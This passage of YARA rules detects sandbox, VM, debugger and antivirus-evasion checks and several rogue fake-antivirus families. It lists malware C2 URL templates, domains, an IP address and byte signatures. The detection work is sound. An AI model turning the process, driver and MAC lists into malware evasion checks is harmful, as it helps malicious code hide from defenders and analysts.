$vmdrv2 = "vmhgfs.sys" ascii wide
$vmdrv3 = "prleth.sys" ascii wide
$vmdrv4 = "prlfs.sys" ascii wide
$vmdrv5 = "prlmouse.sys" ascii wide
$vmdrv6 = "prlvideo.sys" ascii wide
$vmdrv7 = "prl_pv32.sys" ascii wide
$vmdrv8 = "vpc-s3.sys" ascii wide
$vmdrv9 = "vmsrvc.sys" ascii wide
$vmdrv10 = "vmx86.sys" ascii wide
$vmdrv11 = "vmnet.sys" ascii wide
$vmsrvc1 = "vmicheartbeat" ascii wide
$vmsrvc2 = "vmicvss" ascii wide
$vmsrvc3 = "vmicshutdown" ascii wide
$vmsrvc4 = "vmicexchange" ascii wide
$vmsrvc5 = "vmci" ascii wide
$vmsrvc6 = "vmdebug" ascii wide
$vmsrvc7 = "vmmouse" ascii wide
$vmsrvc8 = "VMTools" ascii wide
$vmsrvc9 = "VMMEMCTL" ascii wide
$vmsrvc10 = "vmware" ascii wide
$vmsrvc11 = "vmx86" ascii wide
$vmsrvc12 = "vpcbus" ascii wide
$vmsrvc13 = "vpc-s3" ascii wide
$vmsrvc14 = "vpcuhub" ascii wide
$vmsrvc15 = "msvmmouf" ascii wide
$vmsrvc16 = "VBoxMouse" ascii wide
$vmsrvc17 = "VBoxGuest" ascii wide
$vmsrvc18 = "VBoxSF" ascii wide
$vmsrvc19 = "xenevtchn" ascii wide
$vmsrvc20 = "xennet" ascii wide
$vmsrvc21 = "xennet6" ascii wide
$vmsrvc22 = "xensvc" ascii wide
$vmsrvc23 = "xenvdb" ascii wide
$miscproc1 = "vmware2" ascii wide
$miscproc2 = "vmount2" ascii wide
$miscproc3 = "vmusrvc" ascii wide
$miscproc4 = "vmsrvc" ascii wide
$miscproc5 = "vboxservice" ascii wide
$miscproc6 = "vboxtray" ascii wide
$miscproc7 = "xenservice" ascii wide
$vmware_mac_1a = "00-05-69"
$vmware_mac_1b = "00:05:69"
$vmware_mac_2a = "00-50-56"
$vmware_mac_2b = "00:50:56"
$vmware_mac_3a = "00-0C-29"
$vmware_mac_3b = "00:0C:29"
$vmware_mac_4a = "00-1C-14"
$vmware_mac_4b = "00:1C:14"
$virtualbox_mac_1a = "08-00-27"
$virtualbox_mac_1b = "08:00:27"
condition:
2 of them
}
rule SSC_SandboxDetectMisc
{
meta:
Description = "Risk.SBDtc.sm"
ThreatLevel = "3"
strings:
$sbxie1 = "sbiedll" nocase ascii wide
$prodid1 = "55274-640-2673064-23950" ascii wide
$prodid2 = "76487-644-3177037-23510" ascii wide
$prodid3 = "76487-337-8429955-22614" ascii wide
$proc1 = "joeboxserver" ascii wide
$proc2 = "joeboxcontrol" ascii wide
condition:
any of them
}
rule SSC_avdetect_procs
{
meta:
Description = "Risk.AVDtc.sm"
ThreatLevel = "3"
strings:
$proc2 = "LMon.exe" ascii wide
$proc3 = "sagui.exe" ascii wide
$proc4 = "RDTask.exe" ascii wide
$proc5 = "kpf4gui.exe" ascii wide
$proc6 = "ALsvc.exe" ascii wide
$proc7 = "pxagent.exe" ascii wide
$proc8 = "fsma32.exe" ascii wide
$proc9 = "licwiz.exe" ascii wide
$proc10 = "SavService.exe" ascii wide
$proc11 = "prevxcsi.exe" ascii wide
$proc12 = "alertwall.exe" ascii wide
$proc13 = "livehelp.exe" ascii wide
$proc14 = "SAVAdminService.exe" ascii wide
$proc15 = "csi-eui.exe" ascii wide
$proc16 = "mpf.exe" ascii wide
$proc17 = "lookout.exe" ascii wide
$proc18 = "savprogress.exe" ascii wide
$proc19 = "lpfw.exe" ascii wide
$proc20 = "mpfcm.exe" ascii wide
$proc21 = "emlproui.exe" ascii wide
$proc22 = "savmain.exe" ascii wide
$proc23 = "outpost.exe" ascii wide
$proc24 = "fameh32.exe" ascii wide
$proc25 = "emlproxy.exe" ascii wide
$proc26 = "savcleanup.exe" ascii wide
$proc27 = "filemon.exe" ascii wide
$proc28 = "AntiHook.exe" ascii wide
$proc29 = "endtaskpro.exe" ascii wide
$proc30 = "savcli.exe" ascii wide
$proc31 = "procmon.exe" ascii wide
$proc32 = "xfilter.exe" ascii wide
$proc33 = "netguardlite.exe" ascii wide
$proc34 = "backgroundscanclient.exe" ascii wide
$proc35 = "Sniffer.exe" ascii wide
$proc36 = "scfservice.exe" ascii wide
$proc37 = "oasclnt.exe" ascii wide
$proc38 = "sdcservice.exe" ascii wide
$proc39 = "acs.exe" ascii wide
$proc40 = "scfmanager.exe" ascii wide
$proc41 = "omnitray.exe" ascii wide
$proc42 = "sdcdevconx.exe" ascii wide
$proc43 = "aupdrun.exe" ascii wide
$proc44 = "spywaretermin" ascii wide
$proc45 = "atorshield.exe" ascii wide
$proc46 = "onlinent.exe" ascii wide
$proc47 = "sdcdevconIA.exe" ascii wide
$proc48 = "sppfw.exe" ascii wide
$proc49 = "spywat~1.exe" ascii wide
$proc50 = "opf.exe" ascii wide
$proc51 = "sdcdevcon.exe" ascii wide
$proc52 = "spfirewallsvc.exe" ascii wide
$proc53 = "ssupdate.exe" ascii wide
$proc54 = "pctavsvc.exe" ascii wide
$proc55 = "configuresav.exe" ascii wide
$proc56 = "fwsrv.exe" ascii wide
$proc57 = "terminet.exe" ascii wide
$proc58 = "pctav.exe" ascii wide
$proc59 = "alupdate.exe" ascii wide
$proc60 = "opfsvc.exe" ascii wide
$proc61 = "tscutynt.exe" ascii wide
$proc62 = "pcviper.exe" ascii wide
$proc63 = "InstLsp.exe" ascii wide
$proc64 = "uwcdsvr.exe" ascii wide
$proc65 = "umxtray.exe" ascii wide
$proc66 = "persfw.exe" ascii wide
$proc67 = "CMain.exe" ascii wide
$proc68 = "dfw.exe" ascii wide
$proc69 = "updclient.exe" ascii wide
$proc70 = "pgaccount.exe" ascii wide
$proc71 = "CavAUD.exe" ascii wide
$proc72 = "ipatrol.exe" ascii wide
$proc73 = "webwall.exe" ascii wide
$proc74 = "privatefirewall3.exe" ascii wide
$proc75 = "CavEmSrv.exe" ascii wide
$proc76 = "pcipprev.exe" ascii wide
$proc77 = "winroute.exe" ascii wide
$proc78 = "protect.exe" ascii wide
$proc79 = "Cavmr.exe" ascii wide
$proc80 = "prifw.exe" ascii wide
$proc81 = "apvxdwin.exe" ascii wide
$proc82 = "rtt_crc_service.exe" ascii wide
$proc83 = "Cavvl.exe" ascii wide
$proc84 = "tzpfw.exe" ascii wide
$proc85 = "as3pf.exe" ascii wide
$proc86 = "schedulerdaemon.exe" ascii wide
$proc87 = "CavApp.exe" ascii wide
$proc88 = "privatefirewall3.exe" ascii wide
$proc89 = "avas.exe" ascii wide
$proc90 = "sdtrayapp.exe" ascii wide
$proc91 = "CavCons.exe" ascii wide
$proc92 = "pfft.exe" ascii wide
$proc93 = "avcom.exe" ascii wide
$proc94 = "siteadv.exe" ascii wide
$proc95 = "CavMud.exe" ascii wide
$proc96 = "armorwall.exe" ascii wide
$proc97 = "avkproxy.exe" ascii wide
$proc98 = "sndsrvc.exe" ascii wide
$proc99 = "CavUMAS.exe" ascii wide
$proc100 = "app_firewall.exe" ascii wide
$proc101 = "avkservice.exe" ascii wide
$proc102 = "snsmcon.exe" ascii wide
$proc103 = "UUpd.exe" ascii wide
$proc104 = "blackd.exe" ascii wide
$proc105 = "avktray.exe" ascii wide
$proc106 = "snsupd.exe" ascii wide
$proc107 = "cavasm.exe" ascii wide
$proc108 = "blackice.exe" ascii wide
$proc109 = "avkwctrl.exe" ascii wide
$proc110 = "procguard.exe" ascii wide
$proc111 = "CavSub.exe" ascii wide
$proc112 = "umxagent.exe" ascii wide
$proc113 = "avmgma.exe" ascii wide
$proc114 = "DCSUserProt.exe" ascii wide
$proc115 = "CavUserUpd.exe" ascii wide
$proc116 = "kpf4ss.exe" ascii wide
$proc117 = "avtask.exe" ascii wide
$proc118 = "avkwctl.exe" ascii wide
$proc119 = "CavQ.exe" ascii wide
$proc120 = "tppfdmn.exe" ascii wide
$proc121 = "aws.exe" ascii wide
$proc122 = "firewall.exe" ascii wide
$proc123 = "Cavoar.exe" ascii wide
$proc124 = "blinksvc.exe" ascii wide
$proc125 = "bgctl.exe" ascii wide
$proc126 = "THGuard.exe" ascii wide
$proc127 = "CEmRep.exe" ascii wide
$proc128 = "sp_rsser.exe" ascii wide
$proc129 = "bgnt.exe" ascii wide
$proc130 = "spybotsd.exe" ascii wide
$proc131 = "OnAccessInstaller.exe" ascii wide
$proc132 = "op_mon.exe" ascii wide
$proc133 = "bootsafe.exe" ascii wide
$proc134 = "xauth_service.exe" ascii wide
$proc135 = "SoftAct.exe" ascii wide
$proc136 = "cmdagent.exe" ascii wide
$proc137 = "bullguard.exe" ascii wide
$proc138 = "xfilter.exe" ascii wide
$proc139 = "CavSn.exe" ascii wide
$proc140 = "VCATCH.EXE" ascii wide
$proc141 = "cdas2.exe" ascii wide
$proc142 = "zlh.exe" ascii wide
$proc143 = "Packetizer.exe" ascii wide
$proc144 = "SpyHunter3.exe" ascii wide
$proc145 = "cmgrdian.exe" ascii wide
$proc146 = "adoronsfirewall.exe" ascii wide
$proc147 = "Packetyzer.exe" ascii wide
$proc148 = "wwasher.exe" ascii wide
$proc149 = "configmgr.exe" ascii wide
$proc150 = "scfservice.exe" ascii wide
$proc151 = "zanda.exe" ascii wide
$proc152 = "authfw.exe" ascii wide
$proc153 = "cpd.exe" ascii wide
$proc154 = "scfmanager.exe" ascii wide
$proc155 = "zerospywarele.exe" ascii wide
$proc156 = "dvpapi.exe" ascii wide
$proc157 = "espwatch.exe" ascii wide
$proc158 = "dltray.exe" ascii wide
$proc159 = "zerospywarelite_installer.exe" ascii wide
$proc160 = "clamd.exe" ascii wide
$proc161 = "fgui.exe" ascii wide
$proc162 = "dlservice.exe" ascii wide
$proc163 = "Wireshark.exe" ascii wide
$proc164 = "sab_wab.exe" ascii wide
$proc165 = "filedeleter.exe" ascii wide
$proc166 = "ashwebsv.exe" ascii wide
$proc167 = "tshark.exe" ascii wide
$proc168 = "SUPERAntiSpyware.exe" ascii wide
$proc169 = "firewall.exe" ascii wide
$proc170 = "ashdisp.exe" ascii wide
$proc171 = "rawshark.exe" ascii wide
$proc172 = "vdtask.exe" ascii wide
$proc173 = "firewall2004.exe" ascii wide
$proc174 = "ashmaisv.exe" ascii wide
$proc175 = "Ethereal.exe" ascii wide
$proc176 = "asr.exe" ascii wide
$proc177 = "firewallgui.exe" ascii wide
$proc178 = "ashserv.exe" ascii wide
$proc179 = "Tethereal.exe" ascii wide
$proc180 = "NetguardLite.exe" ascii wide
$proc181 = "gateway.exe" ascii wide
$proc182 = "aswupdsv.exe" ascii wide
$proc183 = "Windump.exe" ascii wide
$proc184 = "nstzerospywarelite.exe" ascii wide
$proc185 = "hpf_.exe" ascii wide
$proc186 = "avastui.exe" ascii wide
$proc187 = "Tcpdump.exe" ascii wide
$proc188 = "cdinstx.exe" ascii wide
$proc189 = "iface.exe" ascii wide
$proc190 = "avastsvc.exe" ascii wide
$proc191 = "Netcap.exe" ascii wide
$proc192 = "cdas17.exe" ascii wide
$proc193 = "invent.exe" ascii wide
$proc194 = "Netmon.exe" ascii wide
$proc195 = "fsrt.exe" ascii wide
$proc196 = "ipcserver.exe" ascii wide
$proc197 = "CV.exe" ascii wide
$proc198 = "VSDesktop.exe" ascii wide
$proc199 = "ipctray.exe" ascii wide
condition:
3 of them
}
rule SSC_dbgdetect_procs
{
meta:
Description = "Risk.DbgDtc.sm"
ThreatLevel = "3"
strings:
$proc1 = "wireshark" nocase ascii wide
$proc2 = "filemon" nocase ascii wide
$proc3 = "procexp" nocase ascii wide
$proc4 = "procmon" nocase ascii wide
$proc5 = "regmon" nocase ascii wide
$proc6 = "idag" nocase ascii wide
$proc7 = "immunitydebugger" nocase ascii wide
$proc8 = "ollydbg" nocase ascii wide
$proc9 = "petools" nocase ascii wide
condition:
2 of them
}
rule SSC_dbgdetect_files
{
meta:
Description = "Risk.DbgDtc.sm"
ThreatLevel = "3"
strings:
$file1 = "syserdbgmsg" nocase ascii wide
$file2 = "syserboot" nocase ascii wide
$file3 = "SICE" nocase ascii wide
$file4 = "NTICE" nocase ascii wide
condition:
2 of them
}rule SSC_RiskNetFilterSampleA
{
meta:
Description  = "Risk.NetFilter.A.vb"
ThreatLevel  = "5"
strings:
$ = "\\Registry\\Machine\\SYSTEM\\ControlSet001\\services\\epfwwfp" ascii wide
$ = "\\Registry\\Machine\\SYSTEM\\ControlSet001\\services\\epfwwfpr" ascii wide
$ = "\\Registry\\Machine\\SYSTEM\\ControlSet001\\services\\nisdrv" ascii wide
$ = "\\Registry\\Machine\\SYSTEM\\ControlSet001\\services\\symnets" ascii wide
$ = "\\Registry\\Machine\\SYSTEM\\ControlSet001\\services\\klwfp" ascii wide
$ = "\\Registry\\Machine\\SYSTEM\\ControlSet001\\services\\amoncdw8" ascii wide
$ = "\\Registry\\Machine\\SYSTEM\\ControlSet001\\services\\amoncdw7" ascii wide
$ = "\\Registry\\Machine\\SYSTEM\\ControlSet001\\services\\bdfwfpf_pc" ascii wide
$ = "NFSDK Flow Established Callout" ascii wide
$ = "Flow Established Callout" ascii wide
$ = "NFSDK Stream Callout" ascii wide
$ = "Stream Callout" ascii wide
$ = "\\Device\\CtrlSM" ascii wide
$ = "\\DosDevices\\CtrlSM" ascii wide
condition:
all of them
}
rule SSC_RogueDownloaderLoaderAVSoftA
{
meta:
Description  = "Trojan.Loader.sm"
ThreatLevel  = "5"
strings:
$ = "/info.php?idd=" ascii wide
$ = "{95B8F20E-4BC6-4E22-9442-BFB69ED62879}" ascii wide
//$ = "CheckExeSignatures" ascii wide
//$ = "RunInvalidSignatures" ascii wide
$ = "ELEVATECREATEPROCESS" ascii wide
$ = "srvdev.dll" ascii wide
//$ = "EntryPoint" ascii wide
condition:
3 of them
}
rule SSC_RogueModuleAVSoftA
{
meta:
Description  = "Rogue.AVSoft.sm"
ThreatLevel  = "5"
strings:
$ = "sec-red-alert-s.gif" ascii wide
$ = "sec-red-alert-b.gif" ascii wide
$ = "scaning.gif" ascii wide
$ = "scaning-stopped.gif" ascii wide
$ = "rezult-table-head-bg.gif" ascii wide
$ = "banner-get-protection.gif" ascii wide
$ = "netalrt.htm" ascii wide
$ = "alrt.htm" ascii wide
$hex1 = { e8 ?? ?? ?? ?? 83 ?? ?? ?? ?? 74 ?? 83 ?? ?? ?? ?? ?? ?? 74 ?? e8 ?? ?? ?? ?? 3b ?? ?? ?? ?? ?? 73 ?? e8 ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 84 c0 75 ?? e8 ?? ?? ?? ?? 6a 1e 99 59 f7 f9 83 c2 14 69 d2 60 ea 00 00 52 ff d7 e8 ?? ?? ?? ?? 83 f8 01 75 ?? e8 ?? ?? ?? ??}
condition:
(3 of them) or ( any of ($hex*))
}
rule SSC_RogueBraviaxSampleA
{
meta:
Description = "Rogue.Braviax.sm"
ThreatLevel = "5"
strings:
$ = "background_gradient_red.jpg" ascii wide
$ = "red_shield_48.png" ascii wide
$ = "pagerror.gif" ascii wide
$ = "green_shield.png" ascii wide
$ = "refresh.gif" ascii wide
$ = "red_shield.png" ascii wide
$ = "avp:scan" ascii wide
$ = "avp:site" ascii wide
$str1 = "Trojan-BNK.Win32.Keylogger.gen" ascii wide
$str2 = "Trojan-PSW.Win32.Coced.219" ascii wide
$str3 = "Email-Worm.Win32.Eyeveg.f" ascii wide
$str4 = "Virus.BAT.Batalia1.840" ascii wide
$str5 = "Trojan-SMS.SymbOS.Viver.a" ascii wide
$str6 = "Trojan-Spy.HTML.Bankfraud.jk" ascii wide
$str7 = "glohhstt7.com" ascii wide
//$str8 = "Zorton" ascii wide
//$str9 = "Rango" ascii wide
//$str10 = "Sirius" ascii wide
//$str11 = "A-Secure" ascii wide
$str12 = "%1 Protection 201" ascii wide
$str13 = "%1 Antivirus 201" ascii wide
$str14 = "siriuc2014.com" ascii wide
$str15 = "siriucs2016.com" ascii wide
$str16 = "zorton2016.com" ascii wide
$str17 = "zorton2015.com" ascii wide
$str18 = "stormo10.com" ascii wide
$str19 = "fscurat20.com" ascii wide
$str20 = "fscurat21.com" ascii wide
condition:
(3 of them) or (any of ($str*))
}rule SSC_RogueFakePAVSample
{
meta:
Description = "Rogue.FakePAV.sm"
ThreatLevel = "5"
strings:
$ = "ZALERT" ascii wide
$ = "ZAPFrm" ascii wide
$ = "ZAbout" ascii wide
$ = "ZAutoRunFrame" ascii wide
$ = "ZCheckBox" ascii wide
$ = "ZCplAll" ascii wide
$ = "ZFogWnd" ascii wide
$ = "ZFrameDEt" ascii wide
$ = "ZIEWnd" ascii wide
$ = "ZMainFrame" ascii wide
$ = "ZMainWnd" ascii wide
$ = "ZOptionsFrame" ascii wide
$ = "ZProcessFrame" ascii wide
$ = "ZProgressBar" ascii wide
$ = "ZPromo" ascii wide
$ = "ZReg" ascii wide
$ = "ZResFR" ascii wide
$ = "ZServiceFrame" ascii wide
$ = "ZUpdate" ascii wide
$ = "ZWarn" ascii wide
condition:
any of them
}rule SSC_RogueFakeDefenderSample
{
meta:
Description  = "Rogue.FakeDef.sm"
ThreatLevel  = "5"
strings:
$a = "pcdfdata" 		ascii wide
$b = "toplevel_pcdef" 	ascii wide
$ = "%spld%d.exe" ascii wide
$ = "avsrun.exe" ascii wide
$ = "avsdel.exe" ascii wide
$ = "vl.bin" ascii wide
$ = "reginfo.bin" ascii wide
$ = "%s%s.lnk" ascii wide
$ = "%sRemove %s.lnk" ascii wide
$ = "Uninstaller application" ascii wide
$ = "%s%s Help and Support.lnk" ascii wide
$ = "pavsdata" ascii wide
$ = "avsmainwnd" ascii wide
$ = "avsdsvc" ascii wide
$ = "ovcf" ascii wide
$ = "Global\\avsinst" ascii wide
$ = "Global\\avscfglock" ascii wide
$ = "\\loc\\reg\\conn\\activate" ascii wide
$ = "\\forms\\alerts\\vulner" ascii wide
$ = "\\forms\\alerts\\hack" ascii wide
$ = "Software\\Classes\\.exe" ascii wide
$ = "%s was infected with %s and has been successfully repaired" ascii wide
$ = "Attack %s from remote host %d.%d.%d.%d has been successfully blocked" ascii wide
$ = "http://%s/api/ping?stage=1&uid=%S&id=%d&subid=%d&os=%d&avf=%d" ascii wide
$ = "http://%s/api/ping?stage=2&uid=%S&success=%d" ascii wide
$ = "http://%s/api/ping?stage=3&uid=%S" ascii wide
$ = "http://%s/content/scc" ascii wide
$ = "http://%s/postload2/?uid=%S" ascii wide
$ = "http://%S/api/test" ascii wide
$ = "http://%s/load/?uid=%S" ascii wide
$ = "http://%s/html/viruslist/?uid=%S" ascii wide
$ = "https://%s/billing/key/?uid=%S" ascii wide
$ = "https://%s/html/billing/?uid=%S" ascii wide
condition:
3 of them
}
rule SSC_RogueFakeReanInternetSecuritySample
{
meta:
Description  = "Rogue.FakeRean.sm"
ThreatLevel  = "5"
strings:
$ = "VB82ea936a-6aa61dbf" ascii wide
$ = "VBOX HARDDISK" ascii wide
$ = "avbase.dat" ascii wide
$ = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii wide
$ = "ORDER #:" ascii wide
$ = "Thank you, the program is now registered!" ascii wide
$ = "To continue please restart the program. Press OK to close the program." ascii wide
$ = "Wrong activation code! Please check and retry" ascii wide
$ = "license. As soon as you complete the activation you will" ascii wide
$ = "This option is available only in the activated version of " ascii wide
$ = "You must activate the program by entering registration information " ascii wide
$ = "has detected that a new Threat Database is available." ascii wide
$ = "items are critical privacy compromising content"
$ = "items is medium privacy threats" ascii wide
$ = "items are junk content of low privacy threats" ascii wide
$ = "has detected a leak of your files though the Internet. " ascii wide
$ = "We strongly recommend that you block the attack immediately" ascii wide
$ = "All threats has been succesfully removed." ascii wide
$ = "Attention! We strongly recommend that you activate " ascii wide
$ = "for the safety and faster running of your PC." ascii wide
$ = "No new update available" ascii wide
$ = "Could not connect to server!" ascii wide
$ = "New updates are installed successfully!" ascii wide
$ = "Security Warning!" ascii wide
$ = "Malicious program has been detected." ascii wide
$ = "Click here to protect your computer." ascii wide
$ = "is infected by W32/Blaster.worm" ascii wide
$ = "$$$$$$$$.bat" ascii wide
$ = "Completed!" ascii wide
$ = "Antivirus software uninstalled successfully" ascii wide
$ = "Antivirus uninstall is not success. Please try again..." ascii wide
$ = "-uninstall" ascii wide
$ = "_MUTEX" ascii wide
$ = "/min" ascii wide
condition:
7 of them
}
rule SSC_RogueUnknownFakeAV
{
meta:
Description  = "Rogue.FakeRean.rc"
ThreatLevel  = "5"
strings:
$a = "S:\\appointed\\commanding\\general\\Moravia\\Image[01].exe" ascii wide
$b = "Dresden blockade" ascii wide
$c = "37592837532" ascii wide
$d = "39874598234" ascii wide
$e = "465234750238947532649587203948523-4572304750329458-23459723450-23457" ascii wide
condition:
($a and $b) or ($c and $d) or $e
}
rule SSC_RoguePCDefender
{
meta:
Description  = "Rogue.FakeDef.rc"
ThreatLevel  = "5"
strings:
$hex0 = { 8A 4A 01 56 57 33 FF 47 8B C7 8D 72 03 85 C0 74 28 80 C1 0B 80 F9 5A 7E 11 0F BE C1 83 E8 41 6A 19 99 59 F7 F9 80 C2 41 8A CA 33 C0 38 0E 0F 94 C0 47 46 46 83 FF 10 7C D4 5F 5E C3 }
condition:
any of ($hex*)
}rule SSC_RogueFakeSysDefSample
{
meta:
Description  = "Rogue.FakeSysDef.sm"
ThreatLevel  = "5"
strings:
$ = "smtmp" ascii wide
$ = "attrib -h"  ascii wide
$ = "%s\\license.dat"  ascii wide
$ = "Thank you for purchasing %s"    ascii wide
$ = "%s\\%s_License.txt" ascii wide
$ = "Bad sectors" ascii wide
$ = "Lost cluster chains" ascii wide
$ = "Relocate bad sectors: " ascii wide
$ = "Fix corrupted files: " ascii wide
$ = "Fix cluster chain: " ascii wide
$ = "No errors found. Disk%s health summary %d%%." ascii wide
$ = "Error 0x00000024 - %s_FILE_SYSTEM" ascii wide
$ = "Verifying disk consistency..." ascii wide
$ = "Hard drive spin failure detected" ascii wide
$ = "Checking S.M.A.R.T. attributes" ascii wide
$a = "S.M.A.R.T reports" ascii wide
$ = "Checking HDD surface for bad sectors.." ascii wide
$ = "Scanning sectors 0x%04X-0x%04X..." ascii wide
$ = "Check cancelled." ascii wide
$ = "Hard disk error detected" ascii wide
$ = "Repair volumes" ascii wide
$ = "Hard disk verification completed. No errors found." ascii wide
$ = "Exception Processing Message 0x%08X Parameters" ascii wide
$ = "Windows - Read error" ascii wide
$ = "File system on local disk %s contains critical errors" ascii wide
$ = "explorer.exe - Corrupt Disk" ascii wide
$ = "svchost.exe - Corrupt Disk" ascii wide
condition:
(3 of them) or $a
}rule SSC_RogueWin32LiveSecurityProfessional
{
meta:
Description  = "Rogue.LiveSP.sm"
ThreatLevel  = "5"
strings:
$ = "W32.SillyFDC.BDQ" ascii wide
$ = "Trojan.Peancomm" ascii wide
$ = "Adware.Borlan" ascii wide
$ = "Trojan.Exprez" ascii wide
$ = "Sunshine.B" ascii wide
$ = "SecurityRisk.URLRedir" ascii wide
$ = "Spyware.Ezurl" ascii wide
$ = "W32.Azero.A" ascii wide
$ = "W32.Downloadup.B" ascii wide
$ = "Hacktool.Unreal.A" ascii wide
$ = "Backdoor.Rustock.B" ascii wide
$ = "Infostealer.Snifula.B" ascii wide
$ = "Adware.FCHelp" ascii wide
$ = "Adware.Invinciblekey" ascii wide
$ = "Packed.Dromedan!gen5" ascii wide
$ = "Downloader.Jadelile" ascii wide
$ = "SecShieldFraud!gen7" ascii wide
$ = "Trojan.Komodola" ascii wide
$ = "W32.Stekct" ascii wide
$ = "Packed.Generic.368" ascii wide
$ = "VirusDoctor!gen12" ascii wide
$ = "UnlockAV" ascii wide
$ = "Sign Up in Live Security Professional" ascii wide
$ = "General security:" ascii wide
$ = "Real-Time Shields:" ascii wide
$ = "Self-protection from malware:" ascii wide
$ = "Definitions auto updates:" ascii wide
$ = "Virus definition version:" ascii wide
$ = "Program version:" ascii wide
$ = "Live Security Professional %s." ascii wide
$ = "You have a license" ascii wide
$ = "Your system is protected from possible threats." ascii wide
$ = "3.13.44.20" ascii wide
$ = "Protection level:" ascii wide
$ = "Your computer is fully protected." ascii wide
$ = "Your protection against viruses and spyware is weak" ascii wide
$ = "You must enter the serial number that came to your email to activate your license." ascii wide
$ = "Live Security Professional - Unregistered version" ascii wide
$ = "Scan stopped..." ascii wide
$ = "Scan paused..." ascii wide
$ = "http://185.6.80.65/index.php?r=checkout" ascii wide
$ = "To complete the registration, check your data for correctness." ascii wide
$ = "You have successfully signed up and choose a license. After confirming the payment (about 10 minutes), you get a completely secure system." ascii wide
$ = "Live Security Professional has blocked" ascii wide
$ = "Live security professional" ascii wide
$ = "Successfully Cleared!" ascii wide
$ = "DETECTED VIRUSES" ascii wide
$ = "List of detected viruses." ascii wide
$ = "Total infected:" ascii wide
$ = "10% of the viruses were treated free. For the cure of all viruses, you must purchase a license Pro or Pro Plus." ascii wide
condition:
5 of them
}rule SSC_RogueSpywareDefenderSample
{
meta:
Description  = "Rogue.SDef.sm"
ThreatLevel  = "5"
strings:
$str1 = "/get_two.php?" ascii wide
$str2 = "spyware-defender.com" ascii wide
$str3 = "Spyware Defender 2014" ascii wide
$str4 = "Antivirus MAC 2014" ascii wide
$str5 = "Antivirus WIN 2014" ascii wide
$ = "Delete" ascii wide
$ = "NoRemove" ascii wide
$ = "ForceRemove" ascii wide
$ = "RunInvalidSignatures" ascii wide
$ = "CheckExeSignatures" ascii wide
condition:
(5 of them) or (any of ($str*))
}rule SSC_RogueWin32SystemDoctorA
{
meta:
Description  = "Rogue.SysDoct.rc"
ThreatLevel  = "5"
strings:
$hex0 = { 55 8b ec 83 ec 7c a1 ?? ?? ?? ?? 33 c5 89 ?? ?? 56 68 90 d0 47 00 8d ?? ?? e8 ?? ?? ?? ?? 83 ?? ?? ?? 8b ?? ?? 73 ?? 8d ?? ?? 50 ff ?? ?? ?? ?? ?? 8d ?? ?? 83 f8 ff 74 ?? 6a 00 6a 01 e8 ?? ?? ?? ?? 33 c0 8b ?? ?? 33 cd 5e e8 ?? ?? ?? ?? c9 c3 53 57 33 db 53 6a 01 e8 ?? ?? ?? ?? be a4 d0 47 00 8d ?? ?? a5 a4 be ac d0 47 00 8d ?? ?? a5 a4 be b4 d0 47 00 8d ?? ?? a5 66 ?? a4 be bc d0 47 00 8d ?? ?? a5 a5 66 ?? a4 be 90 88 45 00 8d ?? ?? a5 a5 a5 a5 be 00 10 00 00 56 e8 ?? ?? ?? ?? 59 6a 02 53 89 ?? ?? 53 8d ?? ?? 50 c7 ?? ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 8b f8 83 ff ff 0f ?? ?? ?? ?? ?? 8d ?? ?? 50 53 57 ff ?? ?? ?? ?? ?? 85 c0 74 ?? 8d ?? ?? 50 56 8b ?? ?? 56 8d ?? ?? 50 6a 0c 8d ?? ?? 50 57 ff ?? ?? ?? ?? ?? 85 c0 74 ?? 56 ff ?? ?? ?? ?? ?? 8d ?? ?? 50 56 e8 ?? ?? ?? ?? 59 59 85 c0 75 ?? 8d ?? ?? 50 56 e8 ?? ?? ?? ?? 59 59 85 c0 75 ?? 8d ?? ?? 50 56 e8 ?? ?? ?? ?? 59 59 85 c0 75 ?? 8d ?? ?? 50 56 e8 ?? ?? ?? ?? 59 59 85 c0 74 ?? 33 db 43 56 e8 ?? ?? ?? ?? 59 5f 8b c3 5b e9 ?? ?? ?? ?? 8b ?? ?? eb ?? }
$ = "http://sys-doctor.com" ascii wide
$ = "AA39754E-715219CE" ascii wide
$ = "System Doctor" ascii wide
$ = "C:\\sd.dbg" ascii wide
$ = "C:\\sd1.dbg" ascii wide
condition:
(2 of them) or (any of ($hex*))
}
rule SSC_RogueWin32FufelAVA
{
meta:
Description  = "Rogue.FufelAV.sm"
ThreatLevel  = "5"
strings:
$ = "avp:buy" ascii wide
$ = "avp:scan" ascii wide
$ = "Protection software" ascii wide
$ = "Invalid registration key!" ascii wide
$ = "Unprotected mode request" ascii wide
$ = "Are you sure want to continue in unprotected mode?" ascii wide
$ = "I have serial key" ascii wide
$ = "Continue unprotected" ascii wide
$ = "trying to infect your files" ascii wide
$ = "Your computer was attacked from" ascii wide
$ = "Attack was blocked" ascii wide
$ = "Please register product to block hackers attack" ascii wide
$ = "Scanning completed. No threads found." ascii wide
$ = "Scanning completed. Cleanup is required." ascii wide
$ = "Warning! %d Infections found!" ascii wide
$ = "Registered version" ascii wide
$ = "Unregistered version (Please register)" ascii wide
$ = "Cured" ascii wide
$ = "Infected process" ascii wide
$str_0 = "Sinergia Cleaner" ascii wide
$str_1 = "Sinergia software.lnk" ascii wide
$str_2 = "fufel-av-2.com" ascii wide
$str_3 = "fufel-av.com" ascii wide
condition:
(3 of them) or (any of ($str_*))
}
rule SSC_RogueWinwebsecSample
{
meta:
Description  = "Rogue.Winwebsec.sm"
ThreatLevel  = "5"
strings:
$a = "%s%s\\%s.ico" ascii wide
$b = "%s%s\\%s.exe" ascii wide
condition:
$a or $b
}
rule SSC_RogueSShieldSample
{
meta:
Description  = "Rogue.SShield.sm"
ThreatLevel  = "5"
strings:
$a = "64C665BE" 	wide
$b = "BC0172B25DF2" wide
condition:
$a or $b
}rule SSC_TrojanWin32AntivarSample
{
meta:
Description  = "Trojan.Antivar.sm"
ThreatLevel  = "5"
strings:
$ = "ServerNabs4" ascii wide
$ = "\\system32\\antivar.exe" ascii wide
condition:
any of them
}rule SSC_TrojanDownloaderCbeplaySample
{
meta:
Description  = "Trojan.Cbeplay.sm"
ThreatLevel  = "5"
strings:
$ = "wireshark.exe" ascii wide
$ = "pstorec.dll" ascii wide
$ = "ROOT\\SecurityCenter2" ascii wide
$ = "Select * from AntiVirusProduct" ascii wide
$ = "SbieDll.dll" ascii wide
$ = "OPEN %s.mp3 TYPE MpegVideo ALIAS MP3" ascii wide
$ = "PLAY MP3 wait" ascii wide
